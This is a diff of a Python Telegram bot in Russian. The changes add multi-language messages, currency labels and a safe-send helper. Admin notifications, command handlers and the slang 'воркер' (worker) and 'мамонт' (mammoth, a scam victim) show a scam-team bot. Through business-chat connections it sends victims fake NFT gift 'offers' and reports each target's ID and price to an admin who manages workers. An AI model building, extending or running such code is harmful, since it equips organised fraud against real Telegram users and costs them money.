+                await call.answer(t(offer_lang, "alert_already_accepted"), show_alert=True)
             except Exception:
                 pass
             return
 
         try:
-            await call.answer("Оффер отклонён", show_alert=True)
+            await call.answer(t(offer_lang, "alert_rejected"), show_alert=True)
+        except Exception:
+            pass
+
+        # Убираем кнопки
+        try:
+            if call.message and hasattr(call.message, "message_id"):
+                await bot.edit_message_reply_markup(
+                    chat_id=mammoth_id,
+                    message_id=call.message.message_id,
+                    business_connection_id=o["biz_conn_id"],
+                    reply_markup=None
+                )
         except Exception:
             pass
 
         try:
-            await bot.send_message(
+            await send_message_safe(
                 chat_id=mammoth_id,
-                text="❌ <b>Оффер отклонён</b>",
+                text=t(offer_lang, "rejected_body"),
                 business_connection_id=o["biz_conn_id"],
             )
         except TelegramBadRequest as e:
@@ -499,6 +873,7 @@ async def universal_callback(call: types.CallbackQuery):
             f"💼 Воркер:\n"
             f"   • ID: <code>{worker_id}</code>\n"
             f"   • Username: <b>{worker_display}</b>\n"
+            f"🌐 Язык: <b>{LANGS.get(offer_lang, offer_lang)}</b>\n"
             f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
             f"🔗 Ссылка: {o['gift_link']}"
         )
@@ -524,11 +899,11 @@ async def business_dot_offer(message: types.Message):
     if not parsed:
         return
 
-    gift_name, gift_link, price = parsed
+    gift_name, gift_link, price, currency_override = parsed
 
     biz_conn_id = getattr(message, "business_connection_id", None) or BIZ_CONNS.get(uid)
     if not biz_conn_id:
-        await bot.send_message(uid, "❌ Нет бизнес-подключения")
+        await send_message_safe(uid, t(get_lang(uid), "no_biz_conn"))
         return
 
     try:
@@ -540,7 +915,8 @@ async def business_dot_offer(message: types.Message):
     except Exception as e:
         print(f"[DOT] delete failed: {type(e).__name__}: {e}", flush=True)
 
-    worker_currency = get_currency(uid)
+    worker_currency = currency_override if currency_override else get_currency(uid)
+    worker_lang = get_lang(uid)
 
     offer_id = next_offer_id()
     OFFERS[offer_id] = {
@@ -550,9 +926,9 @@ async def business_dot_offer(message: types.Message):
         "gift_name": gift_name,
         "gift_link": gift_link,
         "price": price,
-        "created_at": datetime.utcnow(),
+        "created_at": datetime.now(timezone.utc),
         "biz_conn_id": biz_conn_id,
-        "lang": get_lang(uid),
+        "lang": worker_lang,
         "currency": worker_currency,
         "status": "pending",
     }
@@ -560,18 +936,18 @@ async def business_dot_offer(message: types.Message):
 
     sent = False
     try:
-        await bot.send_message(
+        await send_message_safe(
             chat_id=chat_id,
             text=make_offer_card(OFFERS[offer_id]),
-            reply_markup=make_offer_kb(offer_id),
+            reply_markup=make_offer_kb(offer_id, worker_lang),
             business_connection_id=biz_conn_id,
             disable_web_page_preview=False,
         )
         sent = True
     except TelegramBadRequest as e:
-        await bot.send_message(uid, f"❌ Ошибка отправки: {e}")
+        await send_message_safe(uid, t(worker_lang, "send_error", error=str(e)))
 
-    cur_label = currency_label(worker_currency)
+    cur_label = get_currency_label(worker_currency, worker_lang)
     worker_uname_log = message.from_user.username or "—"
     await notify_admin(
         f"🆕 <b>Новый оффер #{offer_id}</b>\n\n"
@@ -579,6 +955,7 @@ async def business_dot_offer(message: types.Message):
         f"   • ID: <code>{uid}</code>\n"
         f"   • Username: <b>@{worker_uname_log}</b>\n"
         f"🎯 Мамонт: <code>{chat_id}</code>\n"
+        f"🌐 Язык: <b>{LANGS.get(worker_lang, worker_lang)}</b>\n"
         f"🎁 Подарок: <b>{gift_name}</b>\n"
         f"💰 Цена: <b>{price} {cur_label}</b>\n"
         f"🔗 Ссылка: {gift_link}\n"
@@ -597,45 +974,53 @@ async def cmd_start(message: types.Message):
         return
     lang = get_lang(uid)
     cur = get_currency(uid)
-    await message.answer(
-        f"👋 <b>Offers Bot</b>\n\n"
-        f"👤 ID: <code>{uid}</code>\n"
-        f"🌐 Язык: <b>{LANGS.get(lang, lang)}</b>\n"
-        f"💱 Валюта: <b>{CURRENCY_LABELS.get(cur, cur)}</b>\n\n"
-        f"<b>Команды:</b>\n"
-        f"/lang — сменить язык\n"
-        f"/currency — сменить валюту\n"
-        f"/workers — список воркеров (админ)\n"
-        f"/grant ID — добавить воркера (админ)\n"
-        f"/revoke ID — убрать воркера (админ)\n"
-        f"/offers — активные офферы (админ)\n\n"
-        f"<b>Создать оффер:</b> напиши в бизнес-чате с мамонтом:\n"
-        f"<code>.t.me/nft/XXX 500</code>",
+    curr_label = get_currency_label(cur, lang)
+    
+    text = t(
+        lang,
+        "start_msg",
+        uid=uid,
+        lang=LANGS.get(lang, lang),
+        currency=curr_label
     )
+    await send_message_safe(uid, text)
 
 
 @dp.message(Command("lang"))
 async def cmd_lang(message: types.Message):
-    if not is_worker(message.from_user.id):
+    uid = message.from_user.id
+    if not is_worker(uid):
         return
+    current = get_lang(uid)
     rows = []
-    current = get_lang(message.from_user.id)
     for code, name in LANGS.items():
         mark = "✅ " if code == current else ""
         rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setlang:{code}")])
-    await message.answer("🌐 <b>Выбери язык:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+    await send_message_safe(
+        uid,
+        t(current, "choose_lang"),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
+    )
 
 
 @dp.message(Command("currency"))
 async def cmd_currency(message: types.Message):
-    if not is_worker(message.from_user.id):
+    uid = message.from_user.id
+    if not is_worker(uid):
         return
+    current = get_currency(uid)
+    lang = get_lang(uid)
     rows = []
-    current = get_currency(message.from_user.id)
-    for code, name in CURRENCY_LABELS.items():
+    curr_map = CURRENCY_LABELS.get(lang, CURRENCY_LABELS[DEFAULT_LANG])
+    for code, name in curr_map.items():
+        clean_name = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', name)
         mark = "✅ " if code == current else ""
-        rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setcurrency:{code}")])
-    await message.answer("💱 <b>Выбери валюту офферов:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
+        rows.append([InlineKeyboardButton(text=f"{mark}{clean_name}", callback_data=f"setcurrency:{code}")])
+    await send_message_safe(
+        uid,
+        t(lang, "choose_currency"),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
+    )
 
 
 @dp.message(Command("workers"))
@@ -646,8 +1031,9 @@ async def cmd_workers(message: types.Message):
     for wid in sorted(WORKERS):
         lang = get_lang(wid)
         cur = get_currency(wid)
-        lines.append(f"• <code>{wid}</code> — {LANGS.get(lang, lang)} — {CURRENCY_LABELS.get(cur, cur)}")
-    await message.answer("\n".join(lines))
+        cur_label = get_currency_label(cur, lang)
+        lines.append(f"• <code>{wid}</code> — {LANGS.get(lang, lang)} — {cur_label}")
+    await send_message_safe(message.chat.id, "\n".join(lines))
 
 
 @dp.message(Command("grant"))
@@ -656,14 +1042,15 @@ async def cmd_grant(message: types.Message):
         return
     args = (message.text or "").split()
     if len(args) < 2 or not args[1].lstrip("-").isdigit():
-        await message.answer("Использование: <code>/grant user_id</code>")
+        await send_message_safe(message.chat.id, "Использование: <code>/grant user_id</code>")
         return
     uid = int(args[1])
     WORKERS.add(uid)
     save_data()
-    await message.answer(f"✅ <code>{uid}</code> добавлен в воркеры")
+    await send_message_safe(message.chat.id, f"✅ <code>{uid}</code> добавлен в воркеры")
     try:
-        await bot.send_message(uid, "🎉 Тебе выдан доступ воркера. /start")
+        worker_lang = get_lang(uid)
+        await send_message_safe(uid, "🎉 Тебе выдан доступ воркера. Нажми /start")
     except Exception:
         pass
 
@@ -674,14 +1061,14 @@ async def cmd_revoke(message: types.Message):
         return
     args = (message.text or "").split()
     if len(args) < 2 or not args[1].lstrip("-").isdigit():
-        await message.answer("Использование: <code>/revoke user_id</code>")
+        await send_message_safe(message.chat.id, "Использование: <code>/revoke user_id</code>")
         return
     uid = int(args[1])
     WORKERS.discard(uid)
     WORKER_LANGS.pop(uid, None)
     WORKER_CURRENCIES.pop(uid, None)
     save_data()
-    await message.answer(f"✅ <code>{uid}</code> убран из воркеров")
+    await send_message_safe(message.chat.id, f"✅ <code>{uid}</code> убран из воркеров")
 
 
 @dp.message(Command("offers"))
@@ -689,36 +1076,41 @@ async def cmd_offers(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return
     if not OFFERS:
-        await message.answer("📋 Активных офферов нет")
+        await send_message_safe(message.chat.id, "📋 Активных офферов нет")
         return
     lines = [f"📋 <b>Активные офферы ({len(OFFERS)}):</b>\n"]
+    now = datetime.now(timezone.utc)
     for oid, o in OFFERS.items():
         created = o.get("created_at")
         if isinstance(created, datetime):
-            age = datetime.utcnow() - created
+            if created.tzinfo is None:
+                created = created.replace(tzinfo=timezone.utc)
+            age = now - created
             minutes = int(age.total_seconds() // 60)
         else:
             minutes = "?"
         wuname = (o.get("worker_username") or "").lstrip("@")
         worker_display = f"@{wuname}" if wuname else "—"
         st = o.get("status", "pending")
-        cur_label = currency_label(o.get("currency", DEFAULT_CURRENCY))
+        lang = o.get("lang", DEFAULT_LANG)
+        cur_label = get_currency_label(o.get("currency", DEFAULT_CURRENCY), lang)
         lines.append(
             f"#{oid} [{st}] — {o['gift_name']} — <b>{o['price']} {cur_label}</b>\n"
             f"   Воркер: <code>{o['worker_id']}</code> ({worker_display})\n"
             f"   Мамонт: <code>{o['mammoth_id']}</code>\n"
+            f"   Язык: {LANGS.get(lang, lang)}\n"
             f"   Возраст: {minutes} мин."
         )
-    await message.answer("\n".join(lines))
+    await send_message_safe(message.chat.id, "\n".join(lines))
 
 
 # ═══════════════════════════════════════════════════════
-#   STARTUP
+#   STARTUP & POLLING
 # ═══════════════════════════════════════════════════════
 
 async def main():
     print("=" * 60, flush=True)
-    print("BOOT v23", flush=True)
+    print("BOOTING BOT...", flush=True)
     print("=" * 60, flush=True)
     try:
         await bot.delete_webhook(drop_pending_updates=True)
@@ -726,20 +1118,20 @@ async def main():
         print(f"webhook clear fail: {e}", flush=True)
     try:
         await bot.set_my_commands([
-            BotCommand(command="start", description="Меню"),
-            BotCommand(command="lang", description="Сменить язык"),
-            BotCommand(command="currency", description="Сменить валюту"),
-            BotCommand(command="workers", description="Воркеры (админ)"),
-            BotCommand(command="grant", description="Добавить воркера (админ)"),
-            BotCommand(command="revoke", description="Убрать воркера (админ)"),
-            BotCommand(command="offers", description="Активные офферы (админ)"),
+            BotCommand(command="start", description="Меню / Menu"),
+            BotCommand(command="lang", description="Сменить язык / Change language"),
+            BotCommand(command="currency", description="Сменить валюту / Currency"),
+            BotCommand(command="workers", description="Список воркеров (Админ)"),
+            BotCommand(command="grant", description="Добавить воркера (Админ)"),
+            BotCommand(command="revoke", description="Удалить воркера (Админ)"),
+            BotCommand(command="offers", description="Активные офферы (Админ)"),
         ])
     except Exception:
         pass
 
     asyncio.create_task(cleanup_expired_offers())
 
-    print("Polling...", flush=True)
+    print("Polling started successfully...", flush=True)
     await dp.start_polling(bot)
 
 
